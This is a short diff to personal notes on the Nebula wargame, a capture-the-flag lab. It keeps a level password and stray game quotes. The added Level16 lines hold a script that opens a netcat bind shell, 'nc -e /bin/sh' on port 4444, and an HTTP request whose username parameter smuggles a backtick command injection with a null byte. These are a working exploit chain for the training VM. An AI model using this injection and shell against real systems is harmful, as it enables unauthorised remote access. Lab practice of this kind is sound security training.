@@ -203,7 +203,18 @@ next level pass: 574YGIzG
 
 Level16:
 ----------------
-Brood quotes:
+/home/level16/MYSCRIPT:
+#!/bin/sh
+nc.traditional -lvnp 4444 -e /bin/sh
+
+nc nebula 1616
+GET /index.cgi?password=random&username=-"`/*/*/MYSCRIPT`%00"
+
+next level pass: 
+
+Level 17
+---------------------------
+
 It shall be done.
 Ghost reportin'
 Jacked up and good to go
